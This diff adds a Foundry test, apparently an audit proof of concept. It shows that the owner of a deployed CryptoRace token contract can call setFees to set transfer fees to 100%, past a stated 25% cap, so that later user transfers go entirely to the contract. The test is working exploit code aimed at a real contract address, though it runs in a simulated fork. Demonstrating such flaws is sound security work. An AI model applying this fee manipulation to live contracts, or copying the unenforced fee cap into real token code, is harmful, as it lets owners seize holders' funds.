@@ -1,0 +1,89 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.5;
+
+import "forge-std/Test.sol";
+
+// Minimal interface for CryptoRace functions needed in the exploit
+interface ICryptoRace {
+    function getOwner() external view returns (address);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function isFeeExempt(address holder) external view returns (bool);
+    function setFees(uint256 _liquidityFee, uint256 _buybackFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _feeDenominator) external;
+    function liquidityFee() external view returns (uint256);
+    function buybackFee() external view returns (uint256);
+    function reflectionFee() external view returns (uint256);
+    function marketingFee() external view returns (uint256);
+    function feeDenominator() external view returns (uint256);
+    function totalFee() external view returns (uint256);
+}
+
+contract ExploitTest is Test {
+    ICryptoRace constant target = ICryptoRace(0x35240D91223186133fCb0EC1565c353eb2A546A8);
+    address constant PRESALER = 0x8dC24A8807AB398b5c8a939288Fb010b7572827D;
+
+    address owner;
+    address user = address(0x123456);
+    address receiver = address(0x789ABC);
+
+    function setUp() public {
+        // Get the contract owner (deployer)
+        owner = target.getOwner();
+        vm.label(owner, "Owner");
+        vm.label(PRESALER, "Presaler");
+        vm.label(user, "User");
+        vm.label(receiver, "Receiver");
+
+        // Give some tokens to user from presaler (who holds all supply)
+        vm.prank(PRESALER);
+        target.transfer(user, 1000 * 1e9); // 1000 tokens (9 decimals)
+
+        // Verify user is not fee exempt
+        assertEq(target.isFeeExempt(user), false);
+    }
+
+    function testSetFeesExceedsLimit() public {
+        // Show initial fee settings (5% total fee)
+        assertEq(target.totalFee(), 500);
+        assertEq(target.feeDenominator(), 10000);
+
+        // User transfers 1000 tokens to receiver before fee manipulation
+        uint256 userBalanceBefore = target.balanceOf(user);
+        uint256 receiverBalanceBefore = target.balanceOf(receiver);
+        vm.prank(user);
+        target.transfer(receiver, 1000 * 1e9);
+
+        // With 5% fee, receiver should get 950 tokens
+        assertEq(target.balanceOf(user), userBalanceBefore - 1000 * 1e9);
+        assertEq(target.balanceOf(receiver), receiverBalanceBefore + 950 * 1e9);
+
+        // Owner sets fees to 100% total (5000 liquidity + 0 + 0 + 5000 = 10000)
+        vm.prank(owner);
+        target.setFees(5000, 0, 0, 5000, 10000);
+
+        // Verify totalFee exceeds 25% limit (2500/10000)
+        assertGt(target.totalFee(), 2500);
+        assertEq(target.totalFee(), 10000);
+
+        // Perform another transfer
+        uint256 userBalanceBefore2 = target.balanceOf(user);
+        uint256 receiverBalanceBefore2 = target.balanceOf(receiver);
+        uint256 contractBalanceBefore = target.balanceOf(address(target));
+
+        vm.prank(user);
+        target.transfer(receiver, 1000 * 1e9);
+
+        uint256 feeAmount = 1000 * 1e9 * target.totalFee() / target.feeDenominator();
+        // With 100% fee, feeAmount should equal the full transfer (1000 tokens)
+        assertEq(feeAmount, 1000 * 1e9);
+
+        // User balance decreases by full amount
+        assertEq(target.balanceOf(user), userBalanceBefore2 - 1000 * 1e9);
+        // Receiver gets nothing
+        assertEq(target.balanceOf(receiver), receiverBalanceBefore2);
+        // Contract accumulates the fee
+        assertEq(target.balanceOf(address(target)), contractBalanceBefore + 1000 * 1e9);
+    }
+}
+```
